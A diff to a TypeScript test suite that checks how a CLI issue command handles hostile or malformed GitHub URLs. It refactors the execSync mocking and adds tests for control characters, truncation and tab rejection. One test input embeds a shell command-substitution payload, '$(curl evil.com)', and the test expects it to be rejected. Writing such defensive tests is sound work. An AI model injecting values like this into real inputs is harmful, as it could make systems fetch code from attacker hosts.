@@ -10,9 +10,10 @@
  * 3. trim() only removes JS-defined whitespace, not zero-width chars or tabs/newlines in middle
  */
 import { afterEach, beforeEach, describe, expect, it, mock } from 'bun:test';
-import { execSync } from 'node:child_process';
+import { _internals } from '../../../src/commands/_shared/url-security';
+import { handleIssueCommand } from '../../../src/commands/issue';
 
-// Mock execSync before importing the module under test
+const realExecSync = _internals.execSync;
 const execSyncMock = mock((cmd: string) => {
 	if (cmd === 'git remote get-url origin') {
 		return 'https://github.com/test-owner/test-repo.git';
@@ -20,16 +21,14 @@ const execSyncMock = mock((cmd: string) => {
 	throw new Error('No remote');
 });
 
-mock.module('node:child_process', () => ({
-	execSync: execSyncMock,
-}));
-
-// Import after setting up mock
-import { handleIssueCommand } from '../../../src/commands/issue';
-
 describe('Adversarial Security Tests for issue.ts', () => {
 	beforeEach(() => {
 		execSyncMock.mockClear();
+		_internals.execSync = execSyncMock as typeof _internals.execSync;
+	});
+
+	afterEach(() => {
+		_internals.execSync = realExecSync;
 	});
 
 	// =============================================================================
@@ -83,6 +82,21 @@ describe('Adversarial Security Tests for issue.ts', () => {
 				'https://github.com/owner/repo/issues/42$(curl evil.com)',
 			]);
 			expect(result).toContain('Error:');
+		});
+
+		it('1g. Parse errors strip control characters from the echoed input', () => {
+			const result = handleIssueCommand('/test', ['owner/repo\tbad#42']);
+			expect(result).toContain('Error:');
+			expect(result).toContain('"owner/repo bad#42"');
+			expect(result).not.toContain('\t');
+		});
+
+		it('1h. Parse errors truncate long echoed input previews', () => {
+			const rawInput = `owner/${'a'.repeat(120)}#not-a-number`;
+			const result = handleIssueCommand('/test', [rawInput]);
+			expect(result).toContain('Error:');
+			expect(result).not.toContain(rawInput);
+			expect(result).toContain('…');
 		});
 	});
 
@@ -387,13 +401,13 @@ describe('Adversarial Security Tests for issue.ts', () => {
 			expect(result).toContain('Error:');
 		});
 
-		it('5h. Tab/newline in MIDDLE of URL — these ARE valid URL chars, URL parses', () => {
-			// \t and \n are valid in URL path segments per RFC 3986
+		it('5h. Tab/newline in MIDDLE of URL path is rejected before MODE emission', () => {
 			const result = handleIssueCommand('/test', [
 				'https://github.com/owner/repo\t\n/issues/42',
 			]);
-			// URL parses because [^/]+ matches these chars
-			expect(result).toContain('issue="https://github.com/owner/repo');
+			expect(result).toContain('Error:');
+			expect(result.split('\n')[0]).toContain('owner/repo /issues/42');
+			expect(result.split('\n')[0]).not.toContain('\t');
 		});
 
 		it('5i. Empty path segments — double slash fails', () => {
